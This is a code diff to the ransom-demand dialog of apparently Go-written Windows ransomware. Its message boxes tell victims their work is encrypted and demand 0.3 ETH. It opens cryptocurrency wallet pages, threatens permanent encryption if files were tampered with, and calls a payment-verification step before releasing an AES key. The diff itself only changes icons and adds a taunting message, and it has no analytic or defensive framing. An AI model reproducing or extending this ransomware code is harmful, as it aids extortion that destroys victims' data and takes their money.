@@ -50,17 +50,17 @@ func dialog(sig chan os.Signal) {
     win.MessageBox(
         "Alright, so what?",
         "All your important work has been rendered useless.",
-        win.MB_OK | win.MB_ICONWARNING,
+        win.MB_OK | win.MB_ICONINFORMATION,
     )
     win.MessageBox(
         "Now what?!",
         "No worries, buddy! I can decrypt them, to return them to normal, for the bargain price of 0.3 ETH!",
-        win.MB_OK | win.MB_ICONWARNING,
+        win.MB_OK | win.MB_ICONINFORMATION,
     )
     win.MessageBox(
         "What is ETH?",
         "Click OK to find out more.",
-        win.MB_OK | win.MB_ICONWARNING,
+        win.MB_OK | win.MB_ICONINFORMATION,
     )
     win.ShellExecute("open", "https://www.myetherwallet.com/", "", win.SW_SHOW)
 
@@ -69,7 +69,7 @@ func dialog(sig chan os.Signal) {
         win.MessageBox(
             "Sweet, okay, who do I need to pay?",
             "Unfortunately, you have been dumb enough to tamper with our files. Stay encrypted forever, now. :)",
-            win.MB_OK | win.MB_ICONWARNING,
+            win.MB_OK | win.MB_ICONINFORMATION,
         )
         return
     }
@@ -77,7 +77,7 @@ func dialog(sig chan os.Signal) {
     win.MessageBox(
         "Sweet, okay, who do I need to pay?",
         "Send 0.3 ETH to the address that will open in your browser!",
-        win.MB_OK | win.MB_ICONWARNING,
+        win.MB_OK | win.MB_ICONINFORMATION,
     )
     win.ShellExecute("open", "https://ethplorer.io/address/"+wallet, "", win.SW_SHOW)
 
@@ -89,6 +89,11 @@ func dialog(sig chan os.Signal) {
 
     switch code {
     case win.IDYES:
+        win.MessageBox(
+            "Alright",
+            "Let us verify if you're lying >:)",
+            win.MB_OK | win.MB_ICONASTERISK,
+        )
         aesIVKey, err := victim.VerifyPayment()
         if err != nil {
             win.MessageBox(
